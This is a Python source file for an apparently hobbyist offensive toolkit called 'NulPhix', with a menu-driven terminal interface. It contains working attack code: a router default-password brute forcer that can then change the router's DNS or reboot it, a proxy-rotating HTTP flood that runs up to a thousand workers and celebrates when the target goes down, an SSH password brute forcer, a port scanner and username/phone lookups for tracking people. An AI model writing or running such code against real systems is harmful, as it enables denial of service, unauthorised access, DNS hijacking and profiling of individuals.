import sys
import os
import time
import random
import requests
import logging
import threading
import asyncio
import aiohttp
import shutil
from PIL import Image
from scapy.all import *
from scapy.layers.l2 import ARP, Ether
from concurrent.futures import ThreadPoolExecutor
import dns.resolver
import paramiko
import time
import socks
import socket
from requests.auth import HTTPBasicAuth
import phonenumbers
from phonenumbers import geocoder, carrier


logging.getLogger("scapy.runtime").setLevel(logging.CRITICAL)

BLOCKS = "█▓▒░ "

#----------------------------------------------------------------STYLE----------------------------------------------------------------------#

def timer_format(m, s):
    return f"{m:02d}:{s:02d}"

def get_terminal_size():
    try:
        cols, rows = os.get_terminal_size()
    except:
        cols, rows = 80, 24
    return cols, rows

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def draw_line():
    cols, _ = get_terminal_size()
    print("\033[32m" + "═" * (cols - 1) + "\033[0m")

def matrix_rain(duration=3.5):
    chars = "ABCDEF1234567890░▒▓█$#@%&*"
    cols, rows = get_terminal_size()
    end_time = time.time() + duration
    while time.time() < end_time:
        line = "".join(random.choice(chars) if random.random() > 0.1 else " " for _ in range(cols - 1))
        print(f"\033[32m{line}\033[0m")
        time.sleep(0.01)

def get_optimized_art(img_path):
    cols, _ = shutil.get_terminal_size()
    target_width = cols - 2 if cols < 60 else min(cols - 2, 130)
    try:
        img = Image.open(img_path)
        aspect_ratio = img.height / img.width
        height = int(aspect_ratio * target_width * 0.45)
        img = img.resize((target_width, height)).convert('L')
        pixels = img.getdata()
        ascii_str = "".join([BLOCKS[p // 52] for p in pixels])
        return [ascii_str[i:i + target_width] for i in range(0, len(ascii_str), target_width)]
    except:
        return [" [!] LOGO ERROR "]


#----------------------------------------------------------------NETWORK_SCANNER------------------------------------------------------------#
def network_scan():
    cols, _ = get_terminal_size()
    print("\n\033[32m[+] INITIALIZING SCAN...\033[0m")
    try:
        data = requests.get('http://ip-api.com/json/', timeout=5).json()
        if data.get('status') == 'success':
            print("\n\033[32m" + "╔" + "═" * 18 + " GLOBAL " + "═" * 18 + "╗")
            print(f" ║ TARGET IP   : {data.get('query'):<26} ║")
            print(f" ║ LOCATION    : {data.get('city') + ', ' + data.get('country'):<26} ║")
            print(f" ║ PROVIDER    : {data.get('isp')[:25]:<26} ║")
            print(f" ║ COORDS      : {str(data.get('lat')) + ', ' + str(data.get('lon')):<26} ║")
            print("╚" + "═" * 44 + "╝\033[0m")
    except:
        pass

    print(f"\n \033[32m[1] FULL AUDIT (ROUTER BRUTE)  [2] LIGHT SCAN (ARP ONLY)\033[0m")
    scan_choice = input("\033[32m[?] MODE: \033[0m")

    if scan_choice == "1":
        target_ip, target_user, target_pwd = router_easy_brute()
        if target_ip:
            router_control(target_ip, target_user, target_pwd)

    print(f"\n\033[32m[+] LOCAL NETWORK (ARP)")
    draw_line()
    try:
        conf.verb = 0
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.1.0/24"), timeout=2, verbose=False)
        for _, r in ans:
            print(f" > {r.psrc:<15} | {r.hwsrc}")
    except:
        pass
    draw_line()

def router_easy_brute():
    gateways = ["192.168.1.1", "192.168.0.1"]
    passwords = ["admin", "1234", "password", "12345", "root"]
    cols, _ = get_terminal_size()
    print(f"\n\033[33m{'[ ROUTER VULN CHECK ]'.center(cols)}\033[0m")
    for ip in gateways:
        url = f"http://{ip}"
        print(f"[*] Testing gateway: {url}")
        for pwd in passwords:
            sys.stdout.write(f"\r\033[K\033[37m[*] TRYING: admin:{pwd}\033[0m")
            sys.stdout.flush()
            try:
                r = requests.get(url, auth=HTTPBasicAuth('admin', pwd), timeout=2)
                if r.status_code == 200:
                    print(f"\n\n\033[32m[!] SUCCESS! {ip} -> admin:{pwd}\033[0m")
                    with open("access.txt", "a") as f:
                        f.write(f"ROUTER: {ip} | admin:{pwd}\n")
                    return ip, "admin", pwd
            except:
                break
    print(f"\n\033[31m[-] No default access found on standard gateways.\033[0m")
    return None, None, None

def router_control(ip, user, pwd):
    url = f"http://{ip}"
    auth = HTTPBasicAuth(user, pwd)
    print(f"\n\033[35m[ NULPHIX-ROUTER-ACCESS: {ip} ]\033[0m")
    while True:
        print("\n [1] GET DEVICES  [2] CHANGE DNS  [3] REBOOT  [4] BACK")
        cmd = input(f"\033[35m{user}@{ip}:~# \033[0m")
        if cmd == "1":
            try:
                r = requests.get(f"{url}/userRpm/AssignedIpAddrListRpm.htm", auth=auth, timeout=3)
                print(f"\033[32m{r.text}\033[0m")
            except:
                print("\033[31m[-] Failed to fetch list\033[0m")
        elif cmd == "2":
            new_dns = input("[?] NEW DNS IP: ")
            payload = {'dns1': new_dns, 'dns2': '8.8.8.8'}
            try:
                requests.post(f"{url}/set_dns", auth=auth, data=payload, timeout=3)
                print("\033[32m[+] DNS CHANGED\033[0m")
            except:
                print("\033[31m[-] Failed to change DNS\033[0m")
        elif cmd == "3":
            try:
                requests.get(f"{url}/reboot", auth=auth, timeout=3)
                print("\033[31m[!] ROUTER REBOOTING...\033[0m")
            except:
                pass
            break
        elif cmd == "4":
            break

#----------------------------------------------------------------------DDOS-----------------------------------------------------------------#

def update_proxies():
    urls = [
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
    ]
    all_proxies = []
    print("\033[33m[*] Downloading fresh proxies...\033[0m")

    for url in urls:
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:

                proxies = [p.strip() for p in response.text.split('\n') if ":" in p]
                all_proxies.extend(proxies)
        except:
            print(f"\033[31m[-] Failed to load from {url[:30]}...\033[0m")

    print(f"\033[32m[+] Loaded {len(all_proxies)} proxies total!\033[0m")
    return list(set(all_proxies))

def get_proxies():
    if not os.path.exists("proxy.txt"):
        return update_proxies()
    with open("proxy.txt", "r") as f:
        return [line.strip() for line in f if line.strip()]

def get_advanced_headers():
    platforms = [
        ("Windows NT 10.0; Win64; x64", "Chrome/122.0.0.0"),
        ("iPhone; CPU iPhone OS 17_3_1 like Mac OS X", "Version/17.0 Mobile/15E148 Safari/604.1")
    ]
    plat, br = random.choice(platforms)
    return {
        "User-Agent": f"Mozilla/5.0 ({plat}) AppleWebKit/537.36 (KHTML, like Gecko) {br}",
        "Accept": "*/*",
        "Connection": "keep-alive"
    }

async def async_worker(target, method, proxy_list, stats, stop_event):
    timeout = aiohttp.ClientTimeout(total=1.5)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        while not stop_event.is_set():
            try:
                px = f"http://{random.choice(proxy_list)}" if proxy_list else None
                h = get_advanced_headers()
                if method == "POST":
                    async with session.post(target, headers=h, proxy=px, data={"d": os.urandom(1024).hex()}) as r:
                        await r.release()
                elif method == "HEAD":
                    async with session.head(target, headers=h, proxy=px) as r:
                        await r.release()
                else:
                    async with session.get(target, headers=h, proxy=px) as r:
                        await r.release()
                stats["ok"] += 1
            except:
                stats["err"] += 1

def ddos_simulator():
    cols, _ = get_terminal_size()
    clear()
    draw_line()
    title = "NulPhix-DDOS"
    print(f"\033[31m{title.center(cols)}\033[0m")
    draw_line()

    proxy_list = []
    print(f"\n \033[32m[1] LOCAL PROXY  [2] GITHUB (not recommended)  [3] DIRECT (danger!)\033[0m")
    p_mode = input("\033[32m[?] MODE: \033[0m")
    if p_mode == "1":
        proxy_list = get_proxies()
    elif p_mode == "2":
        proxy_list = update_proxies()

    print(f"\n \033[32m[1] LOCALHOST  [2] EXTERNAL\033[0m")
    target_type = input("\033[32m[?] TYPE: \033[0m")

    if target_type == "1":
        port = input("\033[32m[?] PORT (80): \033[0m") or "80"
        target = f"http://127.0.0.1:{port}"
    else:
        proto = "https://" if input("\n\033[32m[1] HTTP  [2] HTTPS: \033[0m") == "2" else "http://"
        link = input("\033[32m[?] HOST/URL: \033[0m").replace("http://", "").replace("https://", "")
        target = proto + link

    print(f"\n \033[32m[1] GET (lite-mod)  [2] POST (heavy-mod)  [3] HEAD (stealth-mod)\033[0m")
    method = {"2": "POST", "3": "HEAD"}.get(input("\033[32m[?] METHOD: \033[0m"), "GET")

    print(f"\n \033[32m[1] LOW  [2] MED  [3] ULTRA  [4] ASYNC\033[0m")
    p_choice = input("\033[32m[?] POWER: \033[0m")

    stop_event = threading.Event()
    stats = {"ok": 0, "err": 0}
    start_time = time.time()

    check_session = requests.Session()
    target_is_down = False
    consecutive_failures = 0
    last_check_time = 0

    if p_choice == "4":
        threads_count = 1000

        def run_async():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            tasks = [async_worker(target, method, proxy_list, stats, stop_event) for _ in range(threads_count)]
            loop.run_until_complete(asyncio.gather(*tasks))

        threading.Thread(target=run_async, daemon=True).start()
    else:
        threads_count = {"1": 15, "2": 60, "3": 200}.get(p_choice, 60)

        def payload():
            session = requests.Session()
            while not stop_event.is_set():
                try:
                    px = {"http": f"http://{random.choice(proxy_list)}",
                          "https": f"http://{random.choice(proxy_list)}"} if proxy_list else None
                    getattr(session, method.lower())(target, headers=get_advanced_headers(), proxies=px, timeout=1.0)
                    stats["ok"] += 1
                except:
                    stats["err"] += 1
                    if proxy_list: session = requests.Session()

        for _ in range(threads_count):
            threading.Thread(target=payload, daemon=True).start()

    print("\033[32m" + "─" * (cols - 1) + "\033[0m")

    try:
        while not stop_event.is_set():
            dur = time.time() - start_time
            m, s = divmod(int(dur), 60)
            rps = stats["ok"] / dur if dur > 0 else 0
            stat_line = f" {m:02d}:{s:02d} | OK:{stats['ok']} | ERR:{stats['err']} | RPS:{rps:.1f}"
            sys.stdout.write(f"\r\033[K\033[32m{stat_line[:cols - 1]}\033[0m")
            sys.stdout.flush()

            if dur - last_check_time >= 2:
                last_check_time = dur
                try:
                    check_session.get(target, timeout=0.2, stream=True)
                    consecutive_failures = 0
                except (requests.exceptions.RequestException, socket.timeout):
                    consecutive_failures += 1

                if consecutive_failures >= 4:
                    target_is_down = True
                    stop_event.set()
                    break

            time.sleep(0.1)
    except KeyboardInterrupt:
        pass

    stop_event.set()
    clear()
    draw_line()

    if target_is_down:
        print(f"\n\033[31m{'❗ TARGET IS DOWN ❗'.center(cols - 1)}\033[0m")
        print(f"\033[32m{'═' * 10} Well done! {'═' * 10}\033[0m".center(cols - 1))
    else:
        print(f"\n\033[33m[!] FINISHED BY USER\033[0m".center(cols - 1))

    print(f"\033[37mTOTAL TIME: {m:02d}:{s:02d} | TOTAL REQ: {stats['ok'] + stats['err']}\033[0m".center(cols - 1))
    draw_line()
    print("\n")

    logo_lines = get_optimized_art("nulphix-logo.png")
    for line in logo_lines:
        if cols < 60:
            print(f"\033[32m{line}\033[0m")
        else:
            print(f"\033[32m{line.center(cols)}\033[0m")
        time.sleep(0.01)

    print("\n\033[37m[ Press Enter to continue ]\033[0m")
    input()

#----------------------------------------------------------------PORT_SCANNER---------------------------------------------------------------#

def scan_worker(ip, port, open_ports):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((ip, port))
        if result == 0:
            service = get_service(port)
            banner = banner_grab(ip, port)
            open_ports.append((port, service, banner))
            sys.stdout.write(f"\r\033[K\033[32m[+] {port:<5} | {service:<12} | {banner}\033[0m\n")
        sock.close()
    except:
        pass

def get_service(port):
    try:
        return socket.getservbyport(port)
    except:
        services = {80: "http", 443: "https", 8080: "http-proxy", 3389: "rdp", 3306: "mysql", 25565: "minecraft"}
        return services.get(port, "unknown")

def banner_grab(ip, port):
    try:
        s = socket.socket()
        s.settimeout(1.5)
        s.connect((ip, port))
        s.send(b'Head / HTTP/1.1\r\n\r\n')
        banner = s.recv(1024).decode().strip().replace('\n', ' ')
        s.close()
        return banner[:50]
    except:
        return "no banner"

def port_scanner():
    cols, _ = shutil.get_terminal_size()
    clear()
    draw_line()
    print(f"\033[34m{'NulPhix-ULTIMATE-SCANNER-V2'.center(cols)}\033[0m")
    draw_line()

    target = input("\033[32m[?] TARGET IP/DOMAIN: \033[0m")
    try:
        ip = socket.gethostbyname(target)
        print(f"\033[33m[*] RESOLVED IP: {ip}\033[0m")
    except:
        print("\033[31m[!] Error: Host unreachable\033[0m")
        return

    print(f"\n [1] TOP-100  [2] COMMON (1-1024)  [3] FULL (1-65535)  [4] CUSTOM")
    m = input("\033[32m[?] MODE: \033[0m")

    if m == "1":
        r = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 3306, 3389, 5432, 6379, 8080, 8443, 25565]
    elif m == "2":
        r = range(1, 1025)
    elif m == "3":
        r = range(1, 65536)
    else:
        start = int(input("START: "))
        end = int(input("END: "))
        r = range(start, end + 1)

    print(f"\n\033[37m{'PORT':<6} | {'SERVICE':<12} | {'BANNER/INFO'}\033[0m")
    draw_line()

    open_ports = []
    total = len(r)

    with ThreadPoolExecutor(max_workers=1000) as executor:
        for i, p in enumerate(r):
            executor.submit(scan_worker, ip, p, open_ports)
            if i % 50 == 0:
                sys.stdout.write(f"\r\033[37mProgress: {i}/{total}\033[0m")
                sys.stdout.flush()

    draw_line()
    print(f"\033[34m[!] SCAN COMPLETE. FOUND {len(open_ports)} OPEN PORTS.\033[0m")

    if open_ports:
        save = input("\033[32m[?] Save results to scan_report.txt? (y/n): \033[0m")
        if save.lower() == 'y':
            with open("scan_report.txt", "w") as f:
                f.write(f"Scan Report for {ip}\n" + "=" * 30 + "\n")
                for p, s, b in open_ports:
                    f.write(f"PORT: {p} | SERVICE: {s} | BANNER: {b}\n")
            print("\033[32m[+] Saved.\033[0m")

    input("\n\033[37m[ Press Enter ]\033[0m")

def ssh_breaker(ip):
    cols, _ = shutil.get_terminal_size()
    print(f"\n\033[33m{'[!] PRO-BRUTE INITIALIZED [!]'.center(cols)}\033[0m")

    base_user = input("\033[32m[?] TARGET USERNAME (e.g. root): \033[0m") or "root"
    keywords = input("\033[32m[?] KEYWORDS (comma separated): \033[0m").split(",")
    use_proxy = input("\033[32m[?] USE PROXY? (y/n): \033[0m").lower() == 'y'

    passwords = ["123456", "password", "root", "admin", "qwerty"]
    for k in keywords:
        k = k.strip()
        if k:
            passwords.extend([k, k + "123", k + "2024", k + "2025", k + "!", k.capitalize() + "123"])

    if use_proxy:
        p_ip = input("\033[32m[?] PROXY IP: \033[0m")
        p_port = int(input("\033[32m[?] PROXY PORT: \033[0m"))
        socks.set_default_proxy(socks.SOCKS5, p_ip, p_port)
        socket.socket = socks.socksocket

    print(f"\n\033[33m[*] GENERATED {len(passwords)} VARIANTS. ATTACKING...\033[0m")

    for password in passwords:
        sys.stdout.write(f"\r\033[K\033[37m[*] TESTING: {base_user}:{password}\033[0m")
        sys.stdout.flush()

        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, port=22, username=base_user, password=password, timeout=2)

            print(f"\n\n\033[32m" + "═" * cols + "\033[0m")
            print(f"\033[32m[ACCESS GRANTED]: {base_user}:{password}\033[0m".center(cols))
            print(f"\033[32m" + "═" * cols + "\033[0m")
            ssh.close()
            return
        except:
            time.sleep(0.1)

    print(f"\n\n\033[31m[-] ATTACK FAILED. TRY OTHER KEYWORDS.\033[0m")
    input("\n\033[37m[ Press Enter ]\033[0m")

#----------------------------------------------------------------OSINT--------------------------------------------------------------------#

def get_sherlock_db():
    headers = {'User-Agent': 'Mozilla/5.0'}
    urls = [
        "https://raw.githubusercontent.com/sherlock-project/sherlock/master/sherlock_project/resources/data.json",
        "https://sherlock-project.github.io/sherlock-data/data.json"
    ]
    for url in urls:
        try:
            r = requests.get(url, headers=headers, timeout=5)
            if r.status_code == 200: return r.json()
        except:
            continue
    return {}

async def check_site(session, site_name, site_data, username, found_list):
    url = site_data["url"].format(username)
    e_type = site_data.get("errorType")
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}

    try:
        async with session.get(url, timeout=10, headers=headers, allow_redirects=True) as response:
            exists = False
            if e_type == "status_code":
                if response.status == 200: exists = True
            elif e_type == "message":
                html = await response.text()
                err = site_data.get("errorMsg")
                if isinstance(err, list):
                    if not any(msg in html for msg in err) and response.status == 200: exists = True
                elif err not in html and response.status == 200:
                    exists = True
            elif e_type == "response_url":
                if response.status == 200 and str(response.url).rstrip('/') == url.rstrip('/'): exists = True

            if exists:
                found_list.append(url)
                print(f"\r\033[K\033[32m[+] {site_name:<15} | {url}\033[0m")
    except:
        pass

async def sherlock_engine(username):
    db = get_sherlock_db()
    if not db: return
    db.pop('$schema', None)

    cols, _ = shutil.get_terminal_size()
    print(f"\n\033[36m{'─' * cols}\033[0m")
    print(f"\033[1;37mTARGET ID: {username} | DATABASE: {len(db)} NODES\033[0m")
    print(f"\033[36m{'─' * cols}\033[0m\n")

    found = []
    async with aiohttp.ClientSession() as session:
        tasks = []
        for site, data in db.items():
            tasks.append(check_site(session, site, data, username, found))

        # Визуальный индикатор работы
        for i, task in enumerate(asyncio.as_completed(tasks)):
            await task
            percent = (i + 1) / len(tasks) * 100
            print(f"\r\033[33m[*] SCANNING: {percent:.1f}% \033[0m", end="", flush=True)

    print(f"\n\n\033[36m{'─' * cols}\033[0m")
    print(f"\033[1;32m[!] SEARCH FINISHED. {len(found)} MATCHES FOUND.\033[0m")
    print(f"\033[36m{'─' * cols}\033[0m")

    if found:
        save = input(f"\n\033[33m[?] Export results to {username}_osint.txt? (y/n): \033[0m").lower()
        if save == 'y':
            with open(f"{username}_osint.txt", "w", encoding="utf-8") as f:
                f.write(f"SHERLOCK REPORT: {username}\n" + "=" * 30 + "\n")
                for link in found: f.write(f"{link}\n")
            print(f"\033[32m[+] DATA SAVED TO {username}_osint.txt\033[0m")




    input("\n\033[37m[ Press Enter to return ]\033[0m")

def phone_osint():
    num = input("\033[32m[?] NUMBER (+7...): \033[0m")
    try:
        p = phonenumbers.parse(num)
        if phonenumbers.is_valid_number(p):
            c = geocoder.description_for_number(p, "ru")
            o = carrier.name_for_number(p, "ru")
            print(f"\n\033[32m[+] {num}\n └─ LOC: {c}\n └─ ISP: {o}\033[0m")
        else: print("\033[31m[-] Invalid\033[0m")
    except: print("\033[31m[-] Error\033[0m")

def sherlock_module():
    clear()
    draw_line()
    print(f"\033[35m{'NulPhix-SHERLOCK-ULTIMATE'.center(shutil.get_terminal_size()[0])}\033[0m")
    draw_line()

    print(" [1] USERNAME SEARCH  [2] PHONE OSINT  [3] BACK")
    choice = input(f"\n\033[35m@nulphix/osint:~$ \033[0m")

    if choice == "1":
        u = input("\033[32m[?] USERNAME: \033[0m")
        if u: asyncio.run(sherlock_engine(u))
    elif choice == "2":
        phone_osint()

if __name__ == "__main__":
    if os.name == 'nt':
        os.system('cls')
    else:
        print("\033[H\033[2J", end="")

    matrix_rain(3.0)
    clear()

    lines = get_optimized_art("nulphix-logo.png")
    cols, _ = shutil.get_terminal_size()

    print(f"\033[32m[!] SYSTEM DEPLOYED | {cols} COLUMNS\033[0m\n")
    for line in lines:
        if cols < 55:
            print(f"\033[32m{line}\033[0m")
        else:
            print(f"\033[32m{line.center(cols)}\033[0m")
        time.sleep(0.01)

    while True:
        draw_line()
        print(" [1] WIFI-SCANNER  [2] DDOS-ATTACK  [3] PORT-SCANNER  [4] BRUTE-FORCE [5] SHERLOCK [6] EXIT")
        draw_line()
        choice = input("\033[32mvark0ren@nulphix:~$ \033[0m")

        if choice == "1":
            network_scan()
        elif choice == "2":
            ddos_simulator()
        elif choice == "3":
            port_scanner()
        elif choice == "4":
            target = input("\033[32m[?] TARGET IP: \033[0m")
            ssh_breaker(target)
        elif choice == "5":
            sherlock_module()
            import asyncio

            username = input("\033[32m[?] TARGET USERNAME: \033[0m")
            asyncio.run(sherlock_engine(username))
        elif choice in ["6", "exit", "quit"]:
            print("\n\033[31m[!] SYSTEM OFFLINE\033[0m")
            break
        else:
            print("\033[31m[!] Unknown command\033[0m")